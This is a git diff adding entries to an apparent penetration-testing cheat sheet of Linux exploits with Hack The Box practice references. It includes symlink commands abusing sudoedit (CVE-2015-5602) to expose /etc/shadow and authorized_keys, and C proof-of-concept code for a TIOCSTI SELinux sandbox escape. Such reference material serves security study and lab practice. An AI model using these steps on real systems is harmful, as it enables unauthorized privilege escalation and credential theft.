@@ -124,6 +124,16 @@ Exploits:
 Exploits:
 - [https://www.exploit-db.com/exploits/40064](https://www.exploit-db.com/exploits/40064)
 
+### OpenSSH <=6.6 SFTP misconfiguration
+
+Exploit:
+- [https://github.com/SECFORCE/sftp-exploit](https://github.com/SECFORCE/sftp-exploit)
+
+References:
+- [https://www.secforce.com/blog/2018/03/openssh_exploit_32_and_64_bit/](https://www.secforce.com/blog/2018/03/openssh_exploit_32_and_64_bit/)
+
+Practice:
+- HTB - Nightmare
 
 ## Privilege Escalation
 
@@ -141,3 +151,76 @@ Exploits:
 
 Practice:
 - HTB - Popcorn
+
+### CVE-2015-5602 - 'Sudoedit' Unauthorized Privilege Escalation
+- RHEL 5/6/7 / Ubuntu
+- Sudo <= 1.8.14
+- When /etc/sudoers reads:
+```
+<user_to_grant_priv> ALL=(root) NOPASSWD: sudoedit /home/*/*/test.txt
+```
+- Sudoedit does not check the full path if a wildcard is used **twice** (e.g. /home/*/*/file.txt),
+- Allowing a malicious user to replace the file.txt real file with a symbolic link to a different location (e.g. /etc/shadow).
+
+Example:
+- `/home/<user_to_grant_priv>/newdir`, `test.txt` pointing to `/etc/shadow`
+- `ln -sf /etc/shadow /home/<user_to_grant_priv>/newdir/test.txt`
+- Then do `sudoedit /home/<user_to_grant_priv>/newdir/test.txt`
+- OR `sudoedit -u <user_to_grant_priv> /home/<user_to_grant_priv>/newdir/test.txt`
+- [https://github.com/t0kx/privesc-CVE-2015-5602/blob/master/exploit.sh](https://github.com/t0kx/privesc-CVE-2015-5602/blob/master/exploit.sh)
+
+Usages:
+- Expose /etc/shadow
+- Expose ​authorized_keys over HTTP
+```
+cd /var/www/testing/writeup
+ln -s /home/alekos/.ssh/authorized_keys layout.html
+```
+
+References:
+- [https://www.exploit-db.com/exploits/37710](https://www.exploit-db.com/exploits/37710)
+
+Practice:
+- [https://github.com/t0kx/privesc-CVE-2015-5602](https://github.com/t0kx/privesc-CVE-2015-5602)
+- HTB - Jocker
+
+### CVE-2016-7545 - SELinux sandbox escape
+
+- When executing a program via the SELinux sandbox
+- The nonpriv session can escape to the parent session
+- By using the TIOCSTI ioctl to push characters into the terminal's input buffer
+
+```
+#include <unistd.h>
+#include <sys/ioctl.h>
+
+int main()
+{
+    char *cmd = "id\n";
+    while(*cmd)
+     ioctl(0, TIOCSTI, cmd++);
+    execlp("/bin/id", "id", NULL);
+}
+
+$ gcc test.c -o test
+$ /bin/sandbox ./test
+id
+```
+
+References
+- [https://seclists.org/oss-sec/2016/q3/606](https://seclists.org/oss-sec/2016/q3/606)
+
+### CVE-2017-1000112 - UFO Linux kernel
+- Ubuntu Trusty 4.4.0-*
+- Ubuntu Xenial 4-8-0-*
+- Ubuntu Xenial (16.04) 4.4.0-81
+
+References:
+ - [https://www.openwall.com/lists/oss-security/2017/08/13/1](https://www.openwall.com/lists/oss-security/2017/08/13/1)
+ - [https://ricklarabee.blogspot.com/2017/12/adapting-poc-for-cve-2017-1000112-to.html](https://ricklarabee.blogspot.com/2017/12/adapting-poc-for-cve-2017-1000112-to.html)
+
+Exploit:
+- [https://github.com/xairy/kernel-exploits/tree/master/CVE-2017-1000112](https://github.com/xairy/kernel-exploits/tree/master/CVE-2017-1000112)
+
+Practice:
+- HTB - Nightmare
